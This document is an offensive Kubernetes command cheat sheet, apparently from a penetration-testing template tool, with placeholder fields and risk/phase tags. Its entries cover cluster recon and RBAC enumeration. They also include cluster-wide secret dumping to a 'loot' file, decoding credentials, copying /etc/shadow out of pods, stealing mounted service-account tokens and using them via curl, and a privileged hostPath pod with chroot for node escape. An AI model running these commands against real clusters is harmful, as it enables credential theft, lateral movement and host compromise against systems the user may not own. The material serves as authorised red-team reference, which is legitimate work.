# Kubernetes
> Cluster enumeration, RBAC checks, secret looting, pod exec, and container-escape primitives via kubectl and the API server.

<!-- tags: cloud,kubernetes,k8s,container -->

---

## list kubeconfig contexts
Show all kubeconfig contexts and highlight the current one to map reachable clusters and identities.

```bash
kubectl --kubeconfig {{KUBECONFIG:file:~/.kube/config}} config get-contexts
```

<!-- meta: risk=low | phase=recon | tags=context,kubeconfig,enum -->

---

## current kubeconfig context
Print the active context so you know which cluster and identity you are operating as.

```bash
kubectl config current-context
```

<!-- meta: risk=low | phase=recon | tags=context,whoami -->

---

## switch kubeconfig context
Pivot to another cluster or identity defined in kubeconfig for lateral movement.

```bash
kubectl config use-context {{KUBE_CONTEXT:str:prod}}
```

<!-- meta: risk=low | phase=post | tags=context,pivot,lateral -->

---

## whoami current rbac identity
Resolve the username, groups, and UID the API server attributes to your credentials.

```bash
kubectl auth whoami
```

<!-- meta: risk=low | phase=recon | tags=rbac,whoami,identity -->

---

## rbac check single permission
Test whether the current identity is allowed a specific verb on a resource in a namespace.

```bash
kubectl auth can-i {{VERB:choice:get=Read one,list=Read many,watch=Stream changes,create=Add new,update=Replace existing,patch=Modify fields,delete=Remove one,deletecollection=Remove many}} {{RESOURCE:choice:secrets=Sensitive credentials,pods=Container groups,deployments=Managed replicas,services=Network endpoints,configmaps=Config key/values,namespaces=Cluster partitions,nodes=Worker hosts,roles=RBAC permissions,rolebindings=RBAC assignments,serviceaccounts=Pod identities}} -n {{NAMESPACE:str:default}}
```

<!-- meta: risk=low | phase=recon | tags=rbac,can-i,privesc,enum -->

---

## rbac enumerate all permissions
Dump every action the current token is permitted to perform; the fastest path to spotting privesc paths.

```bash
kubectl auth can-i --list -n {{NAMESPACE:str:default}}
```

<!-- meta: risk=low | phase=recon | tags=rbac,can-i,privesc,enum -->

---

## list nodes wide
List cluster nodes with internal/external IPs, OS, kernel, and container runtime for targeting.

```bash
kubectl get nodes -o wide
```

<!-- meta: risk=low | phase=recon | tags=nodes,discovery,enum -->

---

## list namespaces
Enumerate namespaces to map tenant and workload boundaries.

```bash
kubectl get namespaces
```

<!-- meta: risk=low | phase=recon | tags=namespaces,discovery,enum -->

---

## list pods all namespaces wide
List every pod across all namespaces with node placement and pod IPs.

```bash
kubectl get pods --all-namespaces -o wide
```

<!-- meta: risk=low | phase=recon | tags=pods,discovery,enum -->

---

## list services all namespaces
Enumerate services and their cluster IPs/ports to find internal attack surface.

```bash
kubectl get services --all-namespaces -o wide
```

<!-- meta: risk=low | phase=recon | tags=services,discovery,enum -->

---

## list deployments in namespace
List deployments to identify workloads, replica counts, and images in use.

```bash
kubectl get deployments -n {{NAMESPACE:str:default}}
```

<!-- meta: risk=low | phase=recon | tags=deployments,discovery,enum -->

---

## describe resource in namespace
Show full spec, mounted secrets, service accounts, and events for a named resource.

```bash
kubectl describe {{RESOURCE:choice:pod=Container group,deployment=Managed replicas,service=Network endpoint,secret=Sensitive credentials,configmap=Config key/values,node=Worker host,namespace=Cluster partition,statefulset=Ordered pods,daemonset=Per-node pods,job=Run-once task,cronjob=Scheduled task,ingress=HTTP routing}}/{{NAME:str:web-0}} -n {{NAMESPACE:str:default}}
```

<!-- meta: risk=low | phase=recon | tags=describe,enum,events -->

---

## explain resource schema
Print API documentation for a resource type or field path to craft manifests.

```bash
kubectl explain {{RESOURCE:str:pod.spec.containers}}
```

<!-- meta: risk=low | phase=recon | tags=docs,schema,reference -->

---

## list secrets in namespace
Enumerate secret objects; the names alone hint at tokens, registry creds, and TLS keys.

```bash
kubectl get secrets -n {{NAMESPACE:str:default}}
```

<!-- meta: risk=med | phase=post | tags=secrets,loot,creds -->

---

## decode secret value
Pull and base64-decode a secret's data to recover plaintext credentials or keys.

```bash
kubectl get secret {{SECRET:str:db-creds}} -n {{NAMESPACE:str:default}} -o jsonpath='{.data}' | { command -v jq >/dev/null && jq -r 'to_entries[]|"\(.key): \(.value|@base64d)"' || cat; }
```

<!-- meta: risk=high | phase=post | tags=secrets,decode,creds,loot -->

---

## dump all secrets cluster wide
Export every secret in every namespace to YAML for offline credential harvesting.

```bash
kubectl get secrets --all-namespaces -o yaml > {{OUTFILE:file:./loot/k8s-secrets.yaml}}
```

<!-- meta: risk=high | phase=post | tags=secrets,exfil,loot,creds -->

---

## exec shell in pod
Drop into an interactive shell inside a running pod to pivot into the workload.

```bash
kubectl exec -it {{POD:str:web-0}} -n {{NAMESPACE:str:default}} -- /bin/sh
```

<!-- meta: risk=med | phase=post | tags=exec,shell,pivot,lateral -->

---

## copy file out of pod
Exfiltrate a file from a pod's filesystem to the local box for looting.

```bash
kubectl cp {{NAMESPACE:str:default}}/{{POD:str:web-0}}:{{PATH:str:/etc/shadow}} {{OUTFILE:file:./loot/shadow}}
```

<!-- meta: risk=med | phase=post | tags=cp,exfil,loot,file -->

---

## follow pod logs
Stream a pod's logs, which often leak tokens, query strings, and credentials.

```bash
kubectl logs -f {{POD:str:web-0}} -n {{NAMESPACE:str:default}}
```

<!-- meta: risk=low | phase=post | tags=logs,follow,creds -->

---

## previous pod logs after restart
Read logs from the prior container instance to catch errors or secrets printed before a crash.

```bash
kubectl logs {{POD:str:web-0}} -n {{NAMESPACE:str:default}} --previous
```

<!-- meta: risk=low | phase=post | tags=logs,previous,creds -->

---

## enumerate service account token in pod
From inside a compromised pod, read the mounted service-account token and CA to talk to the API server.

```bash
cat /var/run/secrets/kubernetes.io/serviceaccount/token; echo; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

<!-- meta: risk=high | phase=post | tags=token,serviceaccount,inside,creds -->

---

## query api with service account token
Use a looted service-account token to hit the API server directly and enumerate secrets.

```bash
curl -sk -H "Authorization: Bearer {{TOKEN:str:eyJ...}}" -A "{{UA:str:$(q-ua)}}" {{KUBE_API:url:https://kubernetes.default.svc}}/api/v1/namespaces/{{NAMESPACE:str:default}}/secrets
```

<!-- meta: risk=high | phase=exploit | tags=api,token,curl,secrets,enum -->

---

## privesc run privileged host pod
If you can create pods, schedule a privileged pod that mounts the node root filesystem for a host breakout.

```bash
kubectl run {{POD:str:pwn}} -n {{NAMESPACE:str:default}} --image {{IMAGE:str:alpine}} --restart=Never --overrides='{"spec":{"hostPID":true,"containers":[{"name":"pwn","image":"alpine","stdin":true,"tty":true,"securityContext":{"privileged":true},"volumeMounts":[{"name":"h","mountPath":"/host"}]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}' -it -- chroot /host sh
```

<!-- meta: risk=critical | phase=exploit | tags=privesc,escape,privileged,hostpath,node,breakout -->

---

## schedule pod on target node
Pin a pod to a specific node to reach that node's host filesystem or kubelet.

```bash
kubectl run {{POD:str:pwn}} -n {{NAMESPACE:str:default}} --image {{IMAGE:str:alpine}} --restart=Never --overrides='{"spec":{"nodeName":"{{NODE:str:node-1}}"}}' -it -- sh
```

<!-- meta: risk=high | phase=exploit | tags=privesc,nodeselector,lateral,node -->

## auth can-i sweep permissions
Enumerate every action your current token / serviceaccount can actually perform. First thing to run after landing on a k8s pod.

```bash
kubectl auth can-i --list
```

<!-- meta: risk=low | phase=recon | tags=kubectl,auth,rbac,permissions -->

---

## list secrets all namespaces
Every secret name across every namespace — namespace, name, and secret type. Doesn't show values (see the decode entry for that).

```bash
kubectl get secrets -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,TYPE:.type'
```

<!-- meta: risk=low | phase=recon | tags=kubectl,secrets,list,namespaces -->

---

## extract secret decode base64
Pull one secret and base64-decode every key in it, printing `key=value` lines.

```bash
kubectl get secret {{NAME:str}} -n {{NAMESPACE:str:default}} -o json | jq -r '.data | to_entries[] | "\(.key)=\(.value | @base64d)"'
```

<!-- meta: risk=medium | phase=post | tags=kubectl,secrets,decode,base64,extract -->

---

## find privileged pods dangerous configs
Pods running with any of the four escape-friendly configs: privileged, hostNetwork, hostPID, or hostIPC. Immediate leads for cluster-wide compromise.

```bash
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.hostNetwork==true or .spec.hostPID==true or .spec.hostIPC==true or ((.spec.containers // [])[].securityContext.privileged==true)) | "\(.metadata.namespace)/\(.metadata.name)"'
```

<!-- meta: risk=low | phase=recon | tags=kubectl,privileged,hostnetwork,hostpid,escape,pods -->

---

## exec shell into pod
Drop into an interactive shell inside a pod. Uses `/bin/sh` for max compatibility — change to `/bin/bash` at fill time if the image has bash.

```bash
kubectl exec -it {{POD:str}} -n {{NAMESPACE:str:default}} -- /bin/sh
```

<!-- meta: risk=low | phase=post | tags=kubectl,exec,shell,pod,interactive -->

---

## list serviceaccount tokens all
Every serviceaccount you can list — namespace + name. Use with `describe sa` to find the token secret name, then `get secret ... -o json | jq .data.token` to extract the actual JWT.

```bash
kubectl get sa -A -o custom-columns='NS:.metadata.namespace,NAME:.metadata.name,SECRETS:.secrets[*].name'
```

<!-- meta: risk=low | phase=recon | tags=kubectl,serviceaccount,tokens,list -->
